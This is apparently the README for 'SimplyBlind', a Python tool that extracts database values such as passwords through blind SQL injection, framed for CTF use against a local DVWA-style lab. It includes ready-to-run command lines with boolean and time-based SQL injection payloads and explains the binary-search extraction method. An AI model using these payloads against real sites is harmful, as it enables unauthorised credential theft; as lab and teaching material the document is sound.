# SimplyBlind  
A script to extracted characters by exploiting blind SQL injection.

Designed for Capture The Flags (CTF) as I felt it was too troublesome to manual extract each character. This is not meant for illegal use. Please do not run this script on sites you do not have permissions on.

# Quick Start Guide:    
There are 2 "attack" modes:
- [Brute](#brute-attack-mode): Brute force every character in the table
- [Quick](#quick-attack-mode): Quick attack narrows down possible CHAR before checking it. Making it faster than brute

Use help flag for more information:
`-h`   For help menu

Modes flag are set with `-m <mode>`:  
- sc   Status Code 
- reg   regex  
- redir   redirect    
- to | nto  timeout | not_timeout  
The mode flag defines what triggers a true statement. True statement is used to see if the inferred character matches the one in database. if yes, that character is part of the password 

## Examples:
### Response Status code
``` shell
python simplyBlind.py quick -p "1' AND BINARY SUBSTR(password, \!I, 1) \!S '\!C' #" -c '{"PHPSESSID":"etc7stehjcs7c4kqaa6p6kit03", "security":"low"}' --get http://localhost/vulnerabilities/sqli_blind/
```
![200](img/200.gif)
``` shell
python simplyBlind.py quick -m sc -s 200 -p "1' AND BINARY SUBSTR(password, \!I, 1) \!S '\!C' #" -c '{"PHPSESSID":"etc7stehjcs7c4kqaa6p6kit03", "security":"low"}' --get http://localhost/vulnerabilities/sqli_blind/
```
![200_2](img/200_2.gif)  

### Regex:
``` shell
python simplyBlind.py quick -m reg --regex "User ID exists in the database" -p "2' AND BINARY SUBSTR(password, \!I, 1) \!S '\!C' #" -c '{"PHPSESSID":"etc7stehjcs7c4kqaa6p6kit03", "security":"low"}' --get http://localhost/vulnerabilities/sqli_blind/
```
![regex](img/regex.gif)  

### Timeout:
```shell
python simplyBlind.py quick -m nto --timeout 0.5 -p "1' AND IF(BINARY SUBSTR(password, \!I, 1) \!S '\!C', False, SLEEP(0.7)) #" -c '{"PHPSESSID":"pojosba3ilii64mlql4cq06ma5", "security":"low"}' --get http://localhost/vulnerabilities/sqli_blind/
```
```shell
python simplyBlind.py quick -m to --timeout 0.5 -p "10' AND IF(BINARY SUBSTR(password, \!I, 1) \!S '\!C', SLEEP(0.7), FALSE) #" -c '{"PHPSESSID":"etc7stehjcs7c4kqaa6p6kit03", "security":"low"}' --get http://localhost/vulnerabilities/sqli_blind/
```
![timeout](img/time.gif)

# Quick Explanations:
## Blind SQL
### When to use:
Blind SQL is used when a website is vulnerable to SQL injection but the attacker is unable to see the returned value of the SQL quarry.   
Thus we cant just print all username and passwords.
### how it works:
As we are unable to see the output we need another way to extract information. We achieve this by executing injection that return some form of true/false indicator. This could be things like:
- How the web page response. E.g. page says "user exist"
- Being redirected
- Returning http status code
- Timeout
- Etc....

## How simply blind works?
### Brute attack mode:
Uses the [payload](#payload) to loop through every character in the [character table](#character-table) against the database to extract character by character.

### Quick attack mode:
lets say the [character table](#character-table) is as follows:

| 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 10 |
| :----: | :----: | :----: | :----: | :----: | :----: | :----: | :----: | :----: | :----: |

The 1st character of the password is **4**.
- The code first takes the middle (in this case the char `5`) and compares to see if 1st char of password is greater then `5`. 
	- if yes, looks at 6 and up. meaning 6 to 10. starting from 8
	- if no, looks at 4 and down. so 1 to 4. starting from 2
- Repeats until the space from the current index to the previous is less or equal to 3. when that happens it checks incrementally of each of the 3 character. 
	 when checking character `3`, 3 to 5 (the previous inferred char) is less the 3 spaces. it looks to see if 3, 4, 5 matches the 1st char of password.
	 
	 how does it know to move up or down?
	 It looks at the last quarry. 
	 - if char `3` returns `True` (meaning 1st char of password greater then `3`). it knows to look at 3, 4 and 5.
	 - if char `3` returns `False` (meaning 1st char of password less then `3`). it knows to look at 3, 2 and 1.
	
	 when it reaches 4 it will return true, thus 4 is the 1st char of the password.

## Payload
>[!Important]
>Use !S key for custom payload even in brute attack mode.  
>Escape exclamation mark for keys. E.g. `\!S` 

The payload is used to set the actual malicious injection into the [body](#body) to be sent to the server.

Default payload: `1" AND BINARY SUBSTR(password, !I, 1) !S \'!C\' #`

`-p <payload>`   Takes in a string to set custom payload. The payload takes in keys that will be replaced with the appropriate value. 
### Keys: 
#### !I = increment 
Increments will run from 1 to the end of character in the [character table](#character-table), or till it's the same value as --limit.
#### !S = symbol 
The symbol is used to narrow down and determine if the targeted character is the character we want.
#### !C = Char 
Character will be the character we are trying to match with.    

### how it works
Let say we have the websites source code. the SQL code is as follows:
``` sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```
where the users input will be set as $id.

The payload I want to use is `4' AND BINARY SUBSTR(password, 1, 1) = '0' #`

when placed in the SQL quarry will look like:
``` sql
SELECT first_name, last_name FROM users WHERE user_id = '4' AND BINARY SUBSTR(password, 1, 1) = '0' #;
```

What the payload does is it looks at the password column of the user whos ID = `4`, compares the 1st character to see if its quails to `0`. If yes, the response will be true. if no, response will be false.

To set the keys
- Replace password character index with !I
- Replace comparison with !S
- Replace compared character with !C
e.g.:
`4' AND BINARY SUBSTR(password, \!I, 1) \!S '\!C' #`
Don't forget to escape exclamation  with `\` in terminal. 

## Body
Default: `id=!P&Submit=Submit`

`-b <body>`   Takes in a string that sets the custom body. Body takes the key `!P` that will be replaced with the payload. 

## Character Table
SimplyBlind takes each character from this table and compares them to the targeted index character of the database to determine if its a match.

Default value: `` !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~``

Create custom table with `--table STRING` 
### Brute attack mode:
Order of each character does not matter.

### Quick attack mode:
Order matters as it uses comparators to determine if the character binary value is greater or lesser then the inferred character.

For MySQL 8.0, The `Unicode Character Sets` is `utf8mb4` which is a `UTF-8 encoding table`. thus the order of that character set is set as the default for this programs character table. if other encoding table is used, you can set your custom table based of the Unicode encoding table.
